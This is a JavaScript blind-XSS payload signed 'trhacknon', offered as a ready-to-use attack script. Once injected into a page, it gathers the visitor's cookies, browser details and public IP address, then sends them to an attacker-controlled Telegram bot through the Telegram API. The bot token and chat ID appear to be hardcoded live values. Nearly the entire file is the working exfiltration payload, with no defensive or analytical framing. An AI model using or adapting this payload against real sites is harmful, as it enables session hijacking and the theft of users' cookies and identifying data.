var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
var chatId = '-1001690993326'; // Your "chatId" Here

function getIPAddress(callback) {
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(null, data.ip))
        .catch(error => callback('Failed to fetch IP address', null));
}

function getClientInfo() {
    var info = `
<b>Blind XSS Madness Alert by trhacknon</b>

<b>XSS Insanity Alert in ${document['domain']}</b>
------------------------------------------------

<b>- URL Target -</b>
<pre>${document['location']['hostname']}${document['location']['pathname']}</pre>

<b>- Document Cookie -</b>
<pre>${document['cookie']}</pre>

<b>- User Agent -</b>
<pre>${navigator.userAgent}</pre>

<b>- Platform -</b>
<pre>${navigator.platform}</pre>

<b>- Language -</b>
<pre>${navigator.language}</pre>

<b>- Online Status -</b>
<pre>${navigator.onLine}</pre>
`;

    getIPAddress(function (ipError, ipAddress) {
        if (ipError) {
            info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
        } else {
            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
            showXSSPopup(info, ipAddress); // Call the function to display the popup with the IP address
        }

        telegramSend(info, ipAddress);
    });
}

function showXSSPopup(info, ipAddress) {
    var popupContent = `
XSS Insanity Alert by trhacknon
----------------------------------

${info}

- IP Address -
${ipAddress}

🚀 This is Blind XSS Madness! 🚀
Check out the chaos:
- [Target Page](${document.location.href})
- [Payload Execution](${document.location.href + encodeURIComponent('<script>alert("Blind XSS Madness!");</script>')})
`;

    alert(popupContent);
}

function telegramSend(textData, ipAddress) {
    var payloadLink = encodeURIComponent('<script>alert("Blind XSS Madness!");</script>');

    var telegramMessage = `
🚀 Blind XSS Madness Alert by trhacknon 🚀
------------------------------------------

- URL Target -
${document.location.href}

- Payload Execution -
[${payloadLink}](https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${payloadLink}&parse_mode=html)

- IP Address -
${ipAddress}

🤪 This is Blind XSS Madness! 🤪
`;

    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}&parse_mode=markdown`)
        .catch(error => console.error('Failed to send message to Telegram:', error));
}

// Call the function to obtain client information
getClientInfo();
